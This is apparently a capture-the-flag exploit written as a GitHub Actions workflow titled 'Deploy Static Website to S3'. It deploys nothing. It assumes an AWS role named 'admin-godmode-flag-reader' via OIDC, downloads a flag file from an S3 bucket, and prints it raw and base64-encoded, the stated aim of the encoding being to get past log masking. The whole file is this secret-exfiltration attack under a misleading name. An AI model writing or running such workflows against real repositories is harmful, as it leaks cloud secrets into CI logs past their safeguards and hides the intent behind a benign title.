name: Deploy Static Website to S3
on:
  push:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

# OIDC permissions for keyless authentication
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3

    # OIDC/IRSA Authentication - No more access keys!
    - name: Configure AWS credentials via OIDC
      uses: aws-actions/configure-aws-credentials@v4
      with:
        role-to-assume: "arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875"
        role-session-name: GitHubActions-Backend-${{ github.run_id }}
        aws-region: "ap-southeast-1"
       
    # Read flag from the S3 Storage.
    - name: Read flag from the secret storage
      run: |
        echo "Downloading flag from S3..."
        aws s3 cp s3://oh-i-really-do-care/flag.txt ./flag.txt
        
        echo "Flag content (raw):"
        cat ./flag.txt
        
        echo "Flag in base64 (backup in case of masking):"
        base64 ./flag.txt
        
        echo "Done. Check above for STDIO2025{...}"
